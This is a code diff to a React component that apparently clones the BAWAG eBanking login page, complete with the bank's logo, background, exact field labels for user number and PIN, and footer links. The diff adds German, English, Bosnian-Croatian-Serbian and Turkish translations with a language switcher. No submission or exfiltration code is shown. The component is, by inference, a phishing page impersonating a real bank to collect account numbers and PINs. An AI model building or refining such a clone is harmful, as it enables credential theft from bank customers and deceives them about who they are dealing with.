@@ -3,14 +3,69 @@ import { Eye, EyeOff, ChevronRight } from "lucide-react";
 import bawagLogo from "@/assets/bawag_logo.png";
 import bawagBg from "@/assets/bawag_background.jpg";
 
+type Lang = "DE" | "EN" | "BKS" | "TR";
+
+const translations: Record<Lang, {
+  days: string[];
+  title: string;
+  tab: string;
+  inputUser: string;
+  inputPin: string;
+  login: string;
+  forgotPin: string;
+  footer: string[];
+}> = {
+  DE: {
+    days: ["Sonntag", "Montag", "Dienstag", "Mittwoch", "Donnerstag", "Freitag", "Samstag"],
+    title: "eBanking Login",
+    tab: "Verfüger",
+    inputUser: "Verfügernummer",
+    inputPin: "PIN (8 bis 16-stellig)",
+    login: "Login",
+    forgotPin: "PIN vergessen oder Verfüger gesperrt?",
+    footer: ["Impressum", "AGB", "Datenschutz", "Nutzungsbedingungen", "Barrierefrei"],
+  },
+  EN: {
+    days: ["Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday"],
+    title: "eBanking Login",
+    tab: "Disposer",
+    inputUser: "Disposer Number",
+    inputPin: "PIN (8 - 16 characters)",
+    login: "Login",
+    forgotPin: "Forgot PIN or disposer locked?",
+    footer: ["Imprint", "Terms and Conditions", "Data Protection", "Terms of Use", "Barrier Free"],
+  },
+  BKS: {
+    days: ["Nedjelja", "Ponedjeljak", "Utorak", "Srijeda", "Četvrtak", "Petak", "Subota"],
+    title: "eBanking Login",
+    tab: "Korisnik",
+    inputUser: "Korisnički broj",
+    inputPin: "PIN (8 do 16 znakova)",
+    login: "Prijava",
+    forgotPin: "Zaboravili ste PIN ili je korisnik blokiran?",
+    footer: ["Impresum", "Opšti uslovi poslovanja", "Zaštita podataka", "Uslovi korišćenja", "bez prepreka"],
+  },
+  TR: {
+    days: ["Pazar", "Pazartesi", "Salı", "Çarşamba", "Perşembe", "Cuma", "Cumartesi"],
+    title: "eBanking Login",
+    tab: "kullanıcı numarası",
+    inputUser: "Kullanıcı kodu",
+    inputPin: "PIN (8 ila 16 haneli)",
+    login: "Giriş",
+    forgotPin: "PIN hatırlamama veya kullanıcı engellendi?",
+    footer: ["Künye", "AGB", "Veri koruma", "Kullanım şartları", "Erişilebilirlik"],
+  },
+};
+
 const Bawag = () => {
   const [verfueger, setVerfueger] = useState("");
   const [pin, setPin] = useState("");
   const [showPin, setShowPin] = useState(false);
+  const [lang, setLang] = useState<Lang>("DE");
 
+  const t = translations[lang];
   const now = new Date();
-  const days = ["Sonntag", "Montag", "Dienstag", "Mittwoch", "Donnerstag", "Freitag", "Samstag"];
-  const dateStr = `${days[now.getDay()]}, ${String(now.getDate()).padStart(2, "0")}.${String(now.getMonth() + 1).padStart(2, "0")}.${now.getFullYear()}, ${String(now.getHours()).padStart(2, "0")}:${String(now.getMinutes()).padStart(2, "0")}`;
+  const dateStr = `${t.days[now.getDay()]}, ${String(now.getDate()).padStart(2, "0")}.${String(now.getMonth() + 1).padStart(2, "0")}.${now.getFullYear()}, ${String(now.getHours()).padStart(2, "0")}:${String(now.getMinutes()).padStart(2, "0")}`;
 
   return (
     <div className="min-h-screen flex flex-col items-center bg-white" style={{ fontFamily: "'Segoe UI', Tahoma, Geneva, Verdana, sans-serif" }}>
@@ -20,11 +75,12 @@ const Bawag = () => {
           <img src={bawagLogo} alt="BAWAG eBanking" className="h-20" />
           <span className="text-xs text-gray-500">{dateStr}</span>
           <div className="flex gap-1">
-            {["DE", "EN", "BKS", "TR"].map((l) => (
+            {(["DE", "EN", "BKS", "TR"] as Lang[]).map((l) => (
               <button
                 key={l}
+                onClick={() => setLang(l)}
                 className={`px-2 py-0.5 text-[11px] font-semibold rounded transition-colors ${
-                  l === "DE"
+                  l === lang
                     ? "bg-gray-200 text-black"
                     : "text-gray-600 hover:text-black"
                 }`}
@@ -51,15 +107,15 @@ const Bawag = () => {
           <div className="absolute top-5 left-5 w-[320px]">
             <div className="bg-white rounded-lg shadow-sm min-h-[380px] flex flex-col">
               <div className="px-4 py-3 rounded-t-lg flex items-center justify-between">
-                <h1 className="text-base font-semibold text-black">eBanking Login</h1>
+                <h1 className="text-base font-semibold text-black">{t.title}</h1>
                 <span className="font-bold text-gray-400 text-base cursor-pointer">?</span>
               </div>
 
               <div className="p-4 flex-1 flex flex-col">
-                {/* Verfüger tab */}
+                {/* Tab */}
                 <div className="mb-4 text-center border-b-2 border-[#990000]">
                   <span className="text-[#990000] text-xs font-semibold pb-1 inline-block">
-                    Verfüger
+                    {t.tab}
                   </span>
                 </div>
 
@@ -68,7 +124,7 @@ const Bawag = () => {
                     type="text"
                     value={verfueger}
                     onChange={(e) => setVerfueger(e.target.value)}
-                    placeholder="Verfügernummer"
+                    placeholder={t.inputUser}
                     className="w-full border border-gray-400 rounded px-3 py-2.5 text-sm focus:outline-none focus:ring-1 focus:ring-[#990000]"
                   />
                 </div>
@@ -79,7 +135,7 @@ const Bawag = () => {
                       type={showPin ? "text" : "password"}
                       value={pin}
                       onChange={(e) => setPin(e.target.value)}
-                      placeholder="PIN (8 bis 16-stellig)"
+                      placeholder={t.inputPin}
                       className="w-full border border-gray-400 rounded px-3 py-2.5 text-sm pr-10 focus:outline-none focus:ring-1 focus:ring-[#990000]"
                     />
                     <button
@@ -94,14 +150,14 @@ const Bawag = () => {
 
                 <div className="flex justify-end mb-3">
                   <button className="w-[60%] py-2.5 bg-[#990000] text-white text-sm font-semibold rounded hover:bg-[#7a0000] transition-colors">
-                    Login
+                    {t.login}
                   </button>
                 </div>
 
                 <div className="mt-auto pt-3">
                   <a href="#" className="text-[11px] text-[#990000] hover:underline flex items-center gap-1">
                     <ChevronRight className="h-4 w-4" />
-                    PIN vergessen oder Verfüger gesperrt?
+                    {t.forgotPin}
                   </a>
                 </div>
               </div>
@@ -147,7 +203,7 @@ const Bawag = () => {
         {/* Footer */}
         <footer className="bg-white border-t border-gray-200 py-3 px-4">
           <div className="flex flex-wrap gap-3 justify-center mb-1">
-            {["Impressum", "AGB", "Datenschutz", "Nutzungsbedingungen", "Barrierefrei"].map((item) => (
+            {t.footer.map((item) => (
               <a key={item} href="#" className="text-[10px] text-black underline hover:no-underline">
                 {item}
               </a>
